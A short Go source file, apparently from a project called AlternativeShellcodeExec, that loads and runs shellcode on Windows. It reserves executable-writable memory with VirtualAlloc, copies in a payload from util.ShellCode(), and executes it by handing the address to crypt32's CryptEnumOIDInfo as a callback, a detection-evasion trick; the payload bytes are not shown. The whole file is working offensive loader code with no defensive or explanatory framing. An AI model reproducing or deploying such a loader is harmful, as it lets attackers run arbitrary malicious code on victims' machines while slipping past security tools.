package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc     = kernel32.NewProc("VirtualAlloc")
	crypt32          = syscall.NewLazyDLL("crypt32.dll")
	CryptEnumOIDInfo = crypt32.NewProc("CryptEnumOIDInfo")
)

func Run(op []byte) {
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	copy((*[1 << 30]byte)(unsafe.Pointer(address))[:], op[:])

	CryptEnumOIDInfo.Call(0, 0, 0, uintptr(address))
}

func main() {
	Run(util.ShellCode())
}
